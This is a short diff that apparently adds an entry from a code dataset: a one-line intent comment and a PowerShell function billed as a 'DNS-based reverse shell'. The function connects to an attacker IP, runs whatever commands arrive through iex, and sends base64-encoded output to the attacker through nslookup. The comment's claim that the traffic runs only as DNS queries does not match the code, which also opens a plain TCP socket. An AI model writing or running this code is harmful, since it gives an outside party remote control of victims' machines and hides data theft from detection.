@@ -1,0 +1,4 @@
+# Natural language intent:
+# DNS-Based PowerShell Reverse Shell, This script uses DNS requests to exfiltrate data, making the reverse shell traffic appear as DNS queries, which can be less suspicious and harder to detect.
+
+function Invoke-DNSReverseShell { param([string]$attacker_ip, [int]$attacker_port) $client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); nslookup $encodedSendback $attacker_ip; $stream.Flush()}; $client.Close() }
